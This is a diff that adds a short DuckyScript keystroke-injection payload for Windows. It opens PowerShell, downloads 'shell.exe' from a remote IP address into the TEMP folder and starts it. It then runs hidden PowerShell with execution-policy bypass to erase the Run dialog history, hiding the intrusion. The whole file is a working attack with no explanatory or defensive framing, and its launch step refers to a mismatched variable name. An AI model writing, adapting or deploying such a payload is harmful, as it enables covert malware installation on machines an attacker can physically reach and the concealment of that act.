@@ -1,0 +1,15 @@
+GUI r
+DELAY 1000
+STRING powershell.exe
+ENTER
+DELAY 100
+STRING $url="http://172.19.4.80/shell.exe"; $outpath="$env:TEMP\shell.exe"; Invoke-WebRequest -Uri $url -OutFile $outpath
+ENTER
+STRING Start-Process -FilePath "$outfile"
+ENTER
+STRING exit
+ENTER
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
